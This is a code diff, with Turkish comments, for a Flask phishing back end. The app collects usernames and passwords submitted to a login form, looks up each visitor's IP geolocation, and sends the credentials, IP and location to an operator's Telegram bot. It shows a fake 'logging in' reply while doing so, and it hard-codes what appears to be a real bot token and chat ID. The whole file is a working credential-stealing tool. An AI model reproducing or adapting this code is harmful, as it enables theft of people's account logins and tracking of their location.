@@ -1,40 +1,56 @@
 from flask import Flask, request, render_template
 import requests
-import os
 
 app = Flask(__name__)
 
-# 🔹 Telegram Bilgileri
-TOKEN = "8053892828:AAH9YMbrFiSchpri9wpV5FkOAevfIsaMUj4"
-CHAT_ID = "7107883815"
+# 🚀 Telegram Bot Bilgileri (BURAYI DÜZENLE)
+TELEGRAM_BOT_TOKEN = "8053892828:AAH9YMbrFiSchpri9wpV5FkOAevfIsaMUj4"  # 🔴 Buraya kendi bot token'ını yaz
+CHAT_ID = "7107883815"  # 🔴 Buraya kendi chat ID'ni yaz
+
+def send_telegram_message(message):
+    """Telegram'a mesaj gönderen fonksiyon"""
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    data = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
+    requests.post(url, data=data)
+
+def get_location(ip):
+    """IP adresinden konum bilgisi alma"""
+    url = f"http://ip-api.com/json/{ip}"
+    response = requests.get(url).json()
+    
+    if response["status"] == "success":
+        return response
+    return None
 
 @app.route('/')
-def home():
-    return render_template("index.html")
+def index():
+    """Ana Sayfa"""
+    return render_template('index.html')
 
 @app.route('/login', methods=['POST'])
 def login():
-    username = request.form.get('username')
-    password = request.form.get('password')
+    """Kullanıcı giriş bilgilerini alıp Telegram'a gönderen route"""
+    username = request.form.get('username')  # Kullanıcı adı
+    password = request.form.get('password')  # Şifre
+    user_ip = request.remote_addr  # IP adresini al
 
-    if not username or not password:
-        return "Eksik bilgi!", 400
+    location = get_location(user_ip)  # IP'den konum bilgisi al
+    if location:
+        location_text = f"{location['city']}, {location['country']} (Lat: {location['lat']}, Lon: {location['lon']})"
+    else:
+        location_text = "Konum alınamadı"
 
-    # 📩 Telegram’a mesaj gönderme testi
-    message = f"📩 Yeni Giriş Bilgisi\n👤 Kullanıcı: {username}\n🔑 Şifre: {password}"
-    print(f"Gönderilecek mesaj: {message}")  # Konsola yazdıralım
-    send_to_telegram(message)
-
-    return "Giriş başarılı!"
-
-def send_to_telegram(message):
-    if TOKEN and CHAT_ID:
-        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-        data = {"chat_id": CHAT_ID, "text": message}
-        response = requests.post(url, data=data)
-        
-        # ✅ Telegram yanıtını log'a yazdır
-        print(f"Telegram API Yanıtı: {response.json()}")
+    # 📩 Telegram'a Gönderilecek Mesaj
+    message = f"""
+📩 *Yeni Giriş* 📩
+👤 *Kullanıcı Adı:* `{username}`
+🔑 *Şifre:* `{password}`
+🌍 *IP:* `{user_ip}`
+📍 *Konum:* {location_text}
+"""
+    send_telegram_message(message)  # Telegram'a mesaj gönder
+    
+    return "Giriş yapılıyor...", 200
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(debug=True)
